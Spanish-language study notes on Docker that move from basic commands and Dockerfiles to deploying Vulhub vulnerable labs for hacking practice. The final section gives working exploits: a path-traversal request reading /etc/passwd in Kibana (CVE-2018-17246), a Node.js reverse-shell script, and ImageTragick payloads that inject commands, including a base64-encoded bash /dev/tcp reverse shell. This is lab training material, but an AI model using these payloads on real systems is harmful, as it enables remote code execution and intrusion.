## Introducción a Docker ❮❯

Tags: #Docker #Contenedor 

**Docker** es una plataforma de **contenedores** de software que permite crear, distribuir y ejecutar aplicaciones en entornos aislados. Esto significa que se pueden empaquetar las aplicaciones con todas sus dependencias y configuraciones en un contenedor que se puede mover fácilmente de una máquina a otra, independientemente de la configuración del sistema operativo o del hardware.

Algunas de las ventajas que se presentan a la hora de practicar hacking usando Docker son:

-   **Aislamiento**: los contenedores de Docker están aislados entre sí, lo que significa que si una aplicación dentro de un contenedor es comprometida, el resto del sistema no se verá afectado.
-   **Portabilidad**: los contenedores de Docker se pueden mover fácilmente de un sistema a otro, lo que los hace ideales para desplegar entornos vulnerables para prácticas de hacking.
-   **Reproducibilidad**: los contenedores de Docker se pueden configurar de forma precisa y reproducible, lo que es importante en el hacking para poder recrear escenarios de ataque.

## Instalación de Docker en Linux

❯ **apt install docker.io**  Para instalar Docker 
❯ **service docker start** Iniciamos el servicio de Docker
❯ **service docker stop** Paramos el servicio de Docker

❯ **docker images** Para mirar las imagenes existentes en Docker
❯ **docker volume ls** Para mirar los volumenes existentes

❯ **docker ps** Para ver los contenedores existentes que se estan ejecutando
-   “**-a**” o “**–all**“: se utiliza para listar todos los contenedores, incluyendo los contenedores detenidos.
-   “**-q**” o “**–quiet**“: se utiliza para mostrar sólo los identificadores numéricos de los contenedores.


## Definiendo la estructura básica de Dockerfile

Un archivo **Dockerfile** se compone de varias secciones, cada una de las cuales comienza con una **palabra clave** en **mayúsculas**, seguida de uno o más argumentos.

Algunas de las secciones más comunes en un archivo Dockerfile son:

-   **FROM**: se utiliza para especificar la imagen base desde la cual se construirá la nueva imagen.
-   **RUN**: se utiliza para ejecutar comandos en el interior del contenedor, como la instalación de paquetes o la configuración del entorno.
-   **COPY**: se utiliza para copiar archivos desde el sistema host al interior del contenedor.
-   **CMD**: se utiliza para especificar el comando que se ejecutará cuando se arranque el contenedor.


❯ **nvim Dockerfile** Nos creamos un archivo docker 
	❯ **FROM ubuntu:latest** -> Para crear una imagen basada en Ubuntu
	❯ **MAINTAINER Omar "omar\@outlook.com"** -> Es opcional colocar datos de la persona
	❯ **ENV DEBIAN_FRONTEND noninteractive**-> Evitamos que entre en modo interactivo al momento de la instalacion 
	❯ **RUN apt update && apt install -y net-tools \\
		iputils-ping \\
		curl \\
		git \\
		nano \\
		apache2 \\
		php\\** 
	❯ **COPY prueba.txt /var/www/html** -> Le decimos que queremos traer archivos de mi equipo al contenedor y en que ruta lo colocamos
	❯ **EXPOSE 80** -> Exponer el puerto 80 el de la maquina como el mio
	❯ **ENTRYPOINT service apache2 start && /bin/bash** -> Para iniciar el servicio instalado y agregamos la bash para evitar que se apague el contenedor

Colocamos la barra \\ para indicar que queremos colocar de una forma tabulada las herramientas que necesitaremos.

## Creación y construcción de imágenes

Para crear una imagen de Docker, es necesario tener un archivo **Dockerfile** que defina la configuración de la imagen. Una vez que se tiene el Dockerfile, se puede utilizar el comando “**docker build**” para construir la imagen. Este comando buscará el archivo ‘Dockerfile’ en el directorio actual y utilizará las instrucciones definidas en el mismo para construir la imagen.

-   **docker build**: es el comando que se utiliza para construir una imagen de Docker a partir de un Dockerfile.

❯ **docker build -t my_first_image .** Para construir nuestra primer imagen, con el punto buscara por el archivo Dockerfile en el directorio actual de trabajo (t=para ponerle un nombre y debe estar en minusculas para que no entre en conflicto)
❯ **docker pull debian:latest** Nos permite descargar una imagen de Docker de un registro de Docker

Cabe mencionar que siempre debemos de ir modificando el archivo **Dockerfile** y en cada cambio debemos de hacer un **docker build**


## Carga de instrucciones en Docker y desplegando nuestro primer contenedor


El comando “**docker run \[options]**” se utiliza para crear y arrancar un contenedor a partir de una imagen. Algunas de las opciones más comunes para el comando “docker run” son:

-   “**-d**” o “**–detach**“: se utiliza para arrancar el contenedor en segundo plano, en lugar de en primer plano.
-   “**-i**” o “**–interactive**“: se utiliza para permitir la entrada interactiva al contenedor.
-   “**-t**” o “**–tty**“: se utiliza para asignar un seudoterminal al contenedor (consola virtual). 
-   “**–name**“: se utiliza para asignar un nombre al contenedor y este ya puede llevar mayusculas.

❯ **docker run -dit --name myContainer my_first_image** Para crear el contenedor le colocamos un nombre y colocamos la imagen antes creada y nos devuleve el identificador de nuestro contenedor 
❯ **docker exec -it myContainer bash** Para conectarnos al contenedor existente llamado myContainer y le ejecutamos el comando bash (Podemos colocarle cualquier comando)

Cabe mencionar que al momento de crear el contenedor **Propio** este te viene "desnudo" por lo que debemos de instalarle todo lo que vayamos a necesitar:
❯ **apt update**
❯ **apt install net-tools -y** 
❯ **apt install iputils-ping -y**
❯ **exit** Salir del Docker

Pero si no queremos hacer esto manualmente podemos agregarlo en el archivo **Dockerfile** que anteriormente habiamos creado con el comando **RUN**
❯ **docker build -t my_first_image:v2 .** Para hacer otra imagen pero ahora con los nuevos cambios, con el punto buscara el archivo Dockerfile en el directorio actual de trabajo
❯ **docker run -dit --name mySecondContainer my_first_image:v2** Para crear el contenedor le colocamos un nombre y colocamos la imagen antes creada y nos devuleve el identificador de nuestro contenedor 


## Comandos comunes para la gestión de contenedores

A continuación, se detallan algunos de los comandos vistos en esta clase:

-   **docker rm $(docker ps -a -q) –force**: este comando se utiliza para eliminar todos los contenedores en el sistema, incluyendo los contenedores detenidos. La opción “**-q**” se utiliza para mostrar sólo los identificadores numéricos de los contenedores, y la opción “**–force**” se utiliza para forzar la eliminación de los contenedores que están en ejecución. Es importante tener en cuenta que la eliminación de todos los contenedores en el sistema puede ser peligrosa, ya que puede borrar accidentalmente contenedores importantes o datos importantes. Por lo tanto, se recomienda tener precaución al utilizar este comando.
-   **docker rm id_contenedor**: este comando se utiliza para eliminar un contenedor específico a partir de su identificador. Es importante tener en cuenta que la eliminación de un contenedor eliminará también cualquier cambio que se haya realizado dentro del contenedor, como la instalación de paquetes o la modificación de archivos.
-   **docker rmi $(docker images -q)**: este comando se utiliza para eliminar todas las imágenes de Docker en el sistema. La opción “**-q**” se utiliza para mostrar sólo los identificadores numéricos de las imágenes. Es importante tener en cuenta que la eliminación de todas las imágenes de Docker en el sistema puede ser peligrosa, ya que puede borrar accidentalmente imágenes importantes o datos importantes. Por lo tanto, se recomienda tener precaución al utilizar este comando.
-   **docker rmi id_imagen**: este comando se utiliza para eliminar una imagen específica a partir de su identificador. Es importante tener en cuenta que la eliminación de una imagen eliminará también cualquier contenedor que se haya creado a partir de esa imagen. Si se desea eliminar una imagen que tiene contenedores en ejecución, se deben detener primero los contenedores y luego eliminar la imagen.


❯ **docker stop ❮ID❯** Para parar el contenedor que se esta ejecutando y solo debemos de poner su identificador 
❯ **docker rm ❮ID❯ --force** Borras un contenedor dado con su ID y lo hacemos de manera forzada 
❯ **docker ps -a -q** Te devuelve el identificador de todos los contenedores y asi lo podriamos usar para poder eliminarlos completamente todos de un jalon
❯ **docker rm $(docker ps -a -q) --force**  Asi borras el contenedor de Docker

❯ **docker rmi ❮ID❯** Para borrar una imagen en especifico
❯ **docker rmi $(docker images -q)** Para borrar todas las imagenes con su identificador

❯ **docker volume rm $(docker volume ls -q)** Para borrar todos los volumenes con su nombre


## Port Forwarding en Docker y uso de monturas

El **port forwarding**, también conocido como reenvío de puertos, nos permite **redirigir el tráfico de red** desde un puerto específico en el host a un puerto específico en el contenedor. Esto nos permitirá acceder a los servicios que se ejecutan dentro del contenedor desde el exterior.

❯ **docker run -dit -p 80:80 --name myWebServer webserver** Para crear el contenedor le colocamos un nombre y colocamos la imagen antes creada y nos devuleve el identificador de nuestro contenedor
* Aplicaremos PortForwarding en donde indicamos que mi puerto 80 sea el puerto 80 del contenedor

❯ **lsof -i:80** Para ver que servicio esta ocuoando cierto puerto
❯ **docker port myWebServer** Miramos el puerto que esta usando para ese servicio
❯ **docker exec -it myWebSever bash** Para conectarnos al contenedor existente y le ejecutamos el comando bash (Podemos colocarle cualquier comando)
	❯ **cd /var/www/html** La ruta tipica de Apache o Nginx en donde tenemos el index.html o el index.php

Docker Compose es una herramienta de orquestación de contenedores que permite definir y ejecutar aplicaciones multi-contenedor de manera fácil y eficiente. Con Docker Compose, podemos describir los diferentes servicios que componen nuestra aplicación en un **archivo YAML** y, a continuación, utilizar un solo comando para ejecutar y gestionar todos estos servicios de manera coordinada.


Las **monturas**, por otro lado, nos permiten compartir un directorio o archivo entre el sistema host y el contenedor. Esto nos permitirá persistir la información entre ejecuciones de contenedores y compartir datos entre diferentes contenedores.

Para utilizar las monturas, se utiliza la opción “**-v**” o “**–volume**” en el comando “**docker run**“. Esta opción se utiliza para especificar la montura y se puede utilizar de varias maneras. Por ejemplo, si se desea montar el directorio “**/home/usuario/datos**” del host en el directorio “**/datos**” del contenedor

❯ **docker run -dit -p 80:80 -v /home/omar/Desktop/docker/:/var/www/html --name myWebServer webserver** Para crear el contenedor le colocamos un nombre y colocamos la imagen antes creada y nos devuleve el identificador de nuestro contenedor
* p -> Aplicaremos PortForwarding en donde indicamos que mi puerto 80 sea el puerto 80 del contenedor
* v -> Para hacer que la primer ruta (Ruta principal) este montada en la segunda y con eso se lograra que cualquier cambio que haga en culaquier de las dos rutas se vea reflejado en ambas


## Despliegue de máquinas vulnerables con Docker-Compose
A continuación, os proporcionamos el enlace al proyecto de Github que estamos usando para esta clase:
-   **Vulhub**: [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)
Asimismo, por aquí os compartimos el enlace al recurso donde se nos ofrece el script en Javascript encargado de establecer la Reverse Shell:
-   **NodeJS Reverse Shell**: [https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell)

Desplegaremos una maquina Kibana con su vulnerabilidad 
* **Kibana** es una interfaz de usuario gratuita y abierta que permite visualizar los datos de ElasticSearch y navegar en el Elastic Stack
* **Elasticsearch** es 
* **Elastic Stack**  es

❯ **svn checkout \https://github.com/vulhub/vulhub/trunk/kibana/CVE-2018-17246** Para clonar una subcarpeta de Github y en donde dice **/tree/master** quitarlo de la url y colocar **/trunk** y el resto de la url
❯ **docker-compose up -d** Para poder desplegar el contenerdor una vez descargada
❯ **docker port cve-2018-17246_kibana_1** Miramos el puerto que esta usando para ese servicio en especifico

Web **localhost:5601** Para poder ver el servicio web de Kibana

❯ **curl  -s -X GET "\http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../etc/passwd"**
* X -> Es el metodo que queremos tramitar GET
* s -> modo silence
❯ **docker-compose logs** Para mirar los logs en Docker pero debes de estar dentro del contenedor 
❯ **docker-compose exec kibana bash** Para ingresar al Kibana
	❯ **cd /tmp** Este dir tiene privilegios de lectura y escritura
	❯ **nano reverse.js**
		(function(){
		    var net = require("net"),
		        cp = require("child_process"),
		        sh = cp.spawn("/bin/sh", []);
		    var client = new net.Socket();
		    client.connect(443, "172.17.0.1", function(){
		        client.pipe(sh.stdin);
		        sh.stdout.pipe(client);
		        sh.stderr.pipe(client);
		    });
		    return /a/; // Prevents the Node.js application form crashing
		})();

Con este archivo loque hacemos es que vamos a crear una ReverShell por un puerto y nuestra IP (172.17.0.1) pero seria la del **docker0**, despues solo nos pondriamos en escucha por Netcat en el puerto 443
❯ **ifconfig docker0** Miramos la IP de la interface docker0

❯ **curl  -s -X GET "\http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../tmp/reverse.js"**
❯ **nc -nlvp 443** Para ponernos en escucha por Netcat en espera de la revershell para Linux


****

Desplegaremos otra maquina llamada **ImageMagick** con su vulnerabilidad 
-   **Proyecto de Github**: [https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick](https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick)

Este proyecto se encarga de procesar contenido multimedia 
❯ **svn checkout \https://github.com/vulhub/vulhub/trunk/imagemagick/imagetragick** Para clonar una subcarpeta de Github y en donde dice **/tree/master** quitarlo de la url y colocar **/trunk** y el resto de la url
❯ **docker-compose up -d** Para poder desplegar el contenerdor una vez descargada
❯ **docker port imagetragick_web_1** Miramos el puerto que esta usando para ese servicio en especifico y nos muestra el 8080

Web **localhost:8080** Para poder ver el servicio web de Imagetragick

Podemos usar BurpSuite con otro puerto para poder interceptar la comunicacion y asi en el campo de la extension del archivo a subir, modificarlo y ver que tipo de archivos acepta. Esto se haria con un ataque de fuuerza bruta en el Intruder y con una expresion regular en **Options > Grep-Match** podemos seleccionar **Add** y despues la expresion o el texto que queremos que nos haga match en la respuesta 

Podemos colocar este contenido en el archivo '.jpg' en Burpsuite y poder explotar la vulnerabilidad
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?|curl "172.72.0.1/testingRCE")'
pop graphic-context
```
❯ **python3 -m http.server 80** Nos montamos un servidor http 80


Ahora podemos hacer la Revershell 
❯ **nvim file.gif**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`echo tqergqerbash64revershell | base64 -d | bash`"||id " )'
pop graphic-context
```
Despues de echo colocaremos la revershell pero que fue codificada en base 64
❯ **echo -n "/bin/bash -i >& /dev/tcp/172.72.0.1/4646 0>&1" | base64** Nos regresara la Revershell codificada 




